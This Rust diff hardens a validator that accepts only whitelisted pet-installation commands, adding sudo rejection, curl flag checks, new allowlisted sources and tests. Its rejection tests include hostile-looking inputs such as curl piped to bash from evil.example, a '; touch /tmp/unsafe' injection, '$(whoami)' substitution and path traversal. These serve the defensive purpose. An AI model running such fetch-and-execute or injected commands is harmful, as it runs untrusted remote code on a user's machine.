@@ -452,6 +452,12 @@ fn is_windows_command(command: &str) -> bool {
         || lower.contains(".ps1")
 }
 
+const AWESOME_CODEX_PET_INSTALL_URL: &str =
+    "https://raw.githubusercontent.com/legeling/awesome-codex-pet/main/scripts/install-pet.sh";
+const AWESOME_CODEX_PET_RAW_BASE: &str =
+    "https://raw.githubusercontent.com/legeling/awesome-codex-pet/main";
+const LENCX_PET_INSTALL_URL: &str = "https://lencx.me/pet/install.sh";
+
 fn validated_pet_command(command: &str) -> Result<(String, Vec<String>), PetError> {
     let trimmed = command.trim();
     if trimmed.contains('\n')
@@ -463,42 +469,133 @@ fn validated_pet_command(command: &str) -> Result<(String, Vec<String>), PetErro
             "为保护本机安全，只支持单条官方宠物安装命令，不支持脚本拼接、重定向或多行 shell".into(),
         ));
     }
+    if trimmed
+        .split_whitespace()
+        .any(|part| part.eq_ignore_ascii_case("sudo"))
+    {
+        return Err(PetError::Invalid(
+            "宠物安装不需要管理员权限，请移除 sudo 后重试".into(),
+        ));
+    }
     let parts: Vec<&str> = trimmed.split_whitespace().collect();
     let safe_id = |value: &str| {
         !value.is_empty()
             && value.len() <= 80
+            && value.as_bytes()[0].is_ascii_alphanumeric()
             && value
                 .chars()
                 .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
     };
-    match parts.as_slice() {
-        ["npx", "petdex", "install", pet] if safe_id(pet) => Ok((
-            "npx".into(),
-            vec!["petdex".into(), "install".into(), (*pet).into()],
-        )),
-        ["curl", "-fsSL", url, "|", "bash", "-s", "--", pet]
-            if *url
-                == "https://raw.githubusercontent.com/legeling/awesome-codex-pet/main/scripts/install-pet.sh"
-                && safe_id(pet) =>
-        {
-            Ok((
-                "/bin/bash".into(),
-                vec![
-                    "-o".into(),
-                    "pipefail".into(),
-                    "-c".into(),
-                    format!(
-                        "/usr/bin/curl -fsSL '{}' | /bin/bash -s -- '{}'",
-                        url, pet
-                    ),
-                ],
-            ))
+    if let ["npx", "petdex", "install", pet] = parts.as_slice() {
+        if safe_id(pet) {
+            return Ok((
+                "npx".into(),
+                vec!["petdex".into(), "install".into(), (*pet).into()],
+            ));
         }
-        _ => Err(PetError::Invalid(
+    }
+    if let ["npx", "@astandrik/codex-pets", "install", pet] = parts.as_slice() {
+        if safe_id(pet) {
+            return Ok((
+                "npx".into(),
+                vec![
+                    "@astandrik/codex-pets".into(),
+                    "install".into(),
+                    (*pet).into(),
+                ],
+            ));
+        }
+    }
+
+    let Some(pipe_index) = parts.iter().position(|part| *part == "|") else {
+        return Err(PetError::Invalid(
             "仅支持 `npx petdex install <宠物ID>` 或 awesome-codex-pet 官方安装命令；其它来源请下载 ZIP 后用“导入宠物包”安装"
                 .into(),
-        )),
+        ));
+    };
+    if parts.iter().filter(|part| **part == "|").count() != 1 {
+        return Err(PetError::Invalid("宠物安装命令只能包含一个固定管道".into()));
     }
+
+    let curl_parts = &parts[..pipe_index];
+    let script_parts = &parts[pipe_index + 1..];
+    if curl_parts.first() != Some(&"curl") {
+        return Err(PetError::Invalid(
+            "awesome-codex-pet 安装命令必须使用 curl 下载官方脚本".into(),
+        ));
+    }
+
+    let mut saw_flags = false;
+    let mut saw_proto = false;
+    let mut saw_tls = false;
+    let mut saw_url = false;
+    let mut index = 1;
+    while index < curl_parts.len() {
+        match curl_parts[index] {
+            "-fsSL" if !saw_flags => saw_flags = true,
+            "--tlsv1.2" if !saw_tls => saw_tls = true,
+            "--proto" if !saw_proto && index + 1 < curl_parts.len() => {
+                let protocol = curl_parts[index + 1].trim_matches(['\'', '"']);
+                if protocol != "=https" {
+                    return Err(PetError::Invalid(
+                        "awesome-codex-pet 安装命令只允许 HTTPS 协议".into(),
+                    ));
+                }
+                saw_proto = true;
+                index += 1;
+            }
+            AWESOME_CODEX_PET_INSTALL_URL | LENCX_PET_INSTALL_URL if !saw_url => saw_url = true,
+            _ => {
+                return Err(PetError::Invalid(
+                    "已登记社区仓库的安装命令包含未允许的 curl 参数或地址".into(),
+                ));
+            }
+        }
+        index += 1;
+    }
+    if !saw_flags || !saw_url {
+        return Err(PetError::Invalid(
+            "社区安装命令缺少固定的 curl 安全参数或官方脚本地址".into(),
+        ));
+    }
+
+    let is_lencx = curl_parts.iter().any(|part| *part == LENCX_PET_INSTALL_URL);
+    let pet = match script_parts {
+        ["bash", "-s", "--", pet] if safe_id(pet) => *pet,
+        ["bash", "-s", "--", "--raw-base", raw_base, pet]
+            if *raw_base == AWESOME_CODEX_PET_RAW_BASE && safe_id(pet) =>
+        {
+            *pet
+        }
+        ["sh", "-s", "--", pet] if is_lencx && safe_id(pet) => *pet,
+        _ => {
+            return Err(PetError::Invalid(
+                "官方宠物脚本只允许一个合法宠物 ID，或 awesome-codex-pet 的固定 --raw-base 参数"
+                    .into(),
+            ));
+        }
+    };
+
+    let script_command = if is_lencx {
+        format!(
+            "/usr/bin/curl -fsSL '{}' | /bin/sh -s -- '{}'",
+            LENCX_PET_INSTALL_URL, pet
+        )
+    } else if script_parts.len() == 6 {
+        format!(
+            "/usr/bin/curl -fsSL --proto '=https' --tlsv1.2 '{}' | /bin/bash -s -- --raw-base '{}' '{}'",
+            AWESOME_CODEX_PET_INSTALL_URL, AWESOME_CODEX_PET_RAW_BASE, pet
+        )
+    } else {
+        format!(
+            "/usr/bin/curl -fsSL --proto '=https' --tlsv1.2 '{}' | /bin/bash -s -- '{}'",
+            AWESOME_CODEX_PET_INSTALL_URL, pet
+        )
+    };
+    Ok((
+        "/bin/bash".into(),
+        vec!["-o".into(), "pipefail".into(), "-c".into(), script_command],
+    ))
 }
 
 /// 执行经过白名单验证的宠物安装命令。
@@ -781,6 +878,28 @@ mod tests {
         assert_eq!(&args[..3], ["-o", "pipefail", "-c"]);
         assert!(args[3].contains("awesome-codex-pet/main/scripts/install-pet.sh"));
         assert!(args[3].contains("buba--yurcek"));
+
+        let hardened = "curl -fsSL --proto '=https' --tlsv1.2 https://raw.githubusercontent.com/legeling/awesome-codex-pet/main/scripts/install-pet.sh | bash -s -- --raw-base https://raw.githubusercontent.com/legeling/awesome-codex-pet/main paimon--lingxiaotian";
+        let (program, args) = validated_pet_command(hardened).expect("hardened official command");
+        assert_eq!(program, "/bin/bash");
+        assert!(args[3].contains("--proto '=https'"));
+        assert!(args[3].contains("--tlsv1.2"));
+        assert!(args[3].contains(AWESOME_CODEX_PET_RAW_BASE));
+        assert!(args[3].contains("paimon--lingxiaotian"));
+
+        let codex_pets = "npx @astandrik/codex-pets install paimon--lingxiaotian";
+        let (program, args) = validated_pet_command(codex_pets).expect("codex-pets command");
+        assert_eq!(program, "npx");
+        assert_eq!(
+            args,
+            ["@astandrik/codex-pets", "install", "paimon--lingxiaotian"]
+        );
+
+        let lencx = "curl -fsSL https://lencx.me/pet/install.sh | sh -s -- kerno";
+        let (program, args) = validated_pet_command(lencx).expect("lencx command");
+        assert_eq!(program, "/bin/bash");
+        assert!(args[3].contains("https://lencx.me/pet/install.sh"));
+        assert!(args[3].contains("/bin/sh -s -- 'kerno'"));
     }
 
     #[test]
@@ -789,9 +908,16 @@ mod tests {
             "sleep 30",
             "false | true",
             "curl -fsSL https://evil.example/install.sh | bash",
+            "curl -fsSL https://raw.githubusercontent.com/legeling/awesome-codex-pet/main/scripts/install-pet.sh | bash -s -- --raw-base https://evil.example pet",
+            "curl -fsSL https://raw.githubusercontent.com/legeling/awesome-codex-pet/main/scripts/install-pet.sh | bash -s -- --unknown value pet",
+            "curl -fsSL --proto '=http' https://raw.githubusercontent.com/legeling/awesome-codex-pet/main/scripts/install-pet.sh | bash -s -- pet",
+            "curl -fsSL https://lencx.me/pet/install.sh | sh -s -- --all",
+            "curl -fsSL https://evil.example/install.sh | sh -s -- pet",
+            "npx @astandrik/codex-pets install ../escape",
             "npx petdex install safe; touch /tmp/unsafe",
             "npx petdex install $(whoami)",
             "npx petdex install ../escape",
+            "sudo npx petdex install safe",
         ] {
             let result = validated_pet_command(command);
             assert!(
